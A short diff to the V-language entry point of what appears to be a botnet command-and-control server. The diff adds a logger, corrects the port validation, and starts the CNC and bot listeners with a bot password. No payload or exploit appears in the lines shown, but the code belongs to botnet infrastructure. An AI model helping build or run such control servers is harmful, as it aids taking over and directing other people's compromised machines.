@@ -1,6 +1,7 @@
 import os
 
 import core.cnc
+import core.logger
 
 fn main() {
 	mut args := os.args.clone()
@@ -39,12 +40,12 @@ fn main() {
 			s.bot_pw = bot_pw
 		}
 	}
-	if s.bot_port.int() == 0 || s.bot_port < 65500 {
-		println("[ x ] Error, No bot port provided. Bot system did not start....")
+	if s.bot_port == 0 || s.bot_port > 65500 {
+		logger.console_log("invalid_bot_port", "No bot port provided. Bot system did not start....", true)
 	}
 
-	if s.port.int() == 0 || s.port.int() > 65500 {
-		println("[x] Error, Invalid port provided. CNC starting on the default port: ${s.port}....")
+	if s.port == 0 || s.port > 65500 {
+		logger.console_log("invalid_port", "Invalid port provided. CNC starting on the default port: ${s.port}....", true)
 	}
 	mut server := go cnc.start(mut &s)
 	go cnc.start_bot(mut &s.bot, s.bot_port.str(), s.bot_pw)
